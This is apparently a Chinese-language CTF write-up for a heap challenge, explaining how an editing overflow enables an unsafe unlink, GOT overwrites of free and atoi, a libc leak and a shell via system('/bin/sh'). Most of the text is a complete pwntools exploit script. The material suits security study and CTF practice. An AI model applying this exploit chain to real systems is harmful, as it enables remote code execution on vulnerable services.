# changeable_note

## 题目简述

题目提供 note 的申请、修改和释放功能，使用较早期 glibc 的双向链表管理逻辑。编辑长度缺少约束，可以伪造相邻 chunk 元数据并触发 unsafe unlink，把全局 `notes` 数组中的指针改写为指向数组本身，进而获得任意地址读写。

## 解题过程

设全局 note 表地址为 `0x4040C0`。在一个可编辑 chunk 中伪造空闲 chunk：

```text
prev_size = 0
size      = 0x21
fd        = notes + 8 - 0x18
bk        = notes + 8 - 0x10
```

同时把后一个 chunk 的 `prev_size` 设为 `0x20`、大小设为 `0x110`，再释放后一个 chunk。unlink 的两次写操作会把 `notes[1]` 改成 `notes + 8 - 0x18` 附近的地址，于是对索引 1 的编辑就等价于修改整个指针数组。

获得任意写后，把数组条目依次布置为 `free@got`、`puts@got` 和 `atoi@got`。先把 `free@got` 改成 `puts`，再“释放”指向 `puts@got` 的 note，便会输出 `puts` 的真实地址。计算 libc 基址后，把 `atoi@got` 改成 `system`，下一次菜单把 `/bin/sh` 当作数字解析时就会执行 `system("/bin/sh")`。

写 GOT 时只写地址的低 7 字节。64 位共享库地址的最高字节原本就是 `\x00`；如果强行写满 8 字节并附带换行，可能破坏相邻 GOT 项。

完整脚本如下；服务地址和端口需要按复现环境替换。

```python
#!/usr/bin/env python3
import hashlib
import string

from pwn import *
from pwnlib.util.iters import mbruteforce

HOST = "example.invalid"
PORT = 0

context.log_level = "debug"
elf = ELF("./note", checksec=False)
libc = ELF("./libc-2.23.so", checksec=False)
io = remote(HOST, PORT)

io.recvuntil(b") == ")
digest = io.recvline().strip().decode()
proof = mbruteforce(
    lambda value: hashlib.sha256(value.encode()).hexdigest() == digest,
    string.printable,
    4,
    method="fixed",
)
io.sendlineafter(b"????> ", proof.encode())

def add(index, size, content):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b">> ", str(index).encode())
    io.sendlineafter(b">> ", str(size).encode())
    io.sendafter(b">> ", content)

def edit(index, payload):
    io.sendlineafter(b">> ", b"2")
    io.sendafter(b">> ", str(index).encode().ljust(8, b"\x00"))
    io.send(payload)

def delete(index):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b">> ", str(index).encode())

notes = 0x4040C0

add(0, 0x20, b"\n")
add(1, 0x20, b"\n")
add(2, 0x100, b"\n")
add(3, 0x20, b"\n")

fake = p64(0) + p64(0x21)
fake += p64(notes + 8 - 0x18) + p64(notes + 8 - 0x10)
fake += p64(0x20) + p64(0x110) + b"\n"
edit(1, fake)
delete(2)

# 让 notes[0:4] 分别指向关键 GOT 项和 notes 本身。
targets = p64(0) * 2
targets += p64(elf.got["free"])
targets += p64(elf.got["puts"])
targets += p64(elf.got["atoi"])
targets += p64(notes) + b"\n"
edit(1, targets)

# free@got -> puts，随后 free(puts@got) 泄露 puts。
edit(0, p64(elf.sym["puts"])[:-1] + b"\n")
delete(1)
puts_addr = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = puts_addr - libc.sym["puts"]
log.success("libc base: %#x", libc.address)

# atoi@got -> system，菜单输入会变成 system 的参数。
edit(2, p64(libc.sym["system"])[:-1] + b"\n")
io.sendlineafter(b">> ", b"/bin/sh\x00")
io.interactive()
```

## 方法总结

unsafe unlink 的价值不只是“向某处写一个地址”，而是把受控指针导回全局指针表，从而把普通编辑功能升级为任意写。之后通过 `free@got -> puts` 完成泄露，再以 `atoi@got -> system` 复用菜单输入作为命令参数。利用时还必须控制写入长度，避免覆盖相邻 GOT 项。
